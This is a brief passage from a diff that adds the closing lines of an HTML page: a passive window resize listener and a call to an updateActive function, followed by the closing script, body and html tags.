+window.addEventListener('resize',updateActive,{passive:true});
+updateActive();
+</script>
+</body>
+</html>
